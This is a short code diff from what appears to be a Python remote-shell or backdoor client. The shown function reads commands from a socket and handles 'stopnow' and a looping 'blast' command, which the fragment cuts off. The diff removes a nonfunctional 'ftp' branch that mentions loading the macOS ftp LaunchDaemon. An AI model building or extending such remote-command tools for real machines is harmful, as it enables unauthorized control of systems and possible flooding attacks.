@@ -33,11 +33,7 @@ def shell():
             elif 'stopnow' == command:
                 s.send('Bye \n')
                 quit()
-
-            elif command[:3] == 'ftp':
-                ('-s launchctl load -w /System/Library/LaunchDaemons/ftp.plist'.encode('utf-8'))
-                
-            
+               
             elif command[:5] == 'blast':
                 blastcnt = 0
                 while blastcnt != 32:
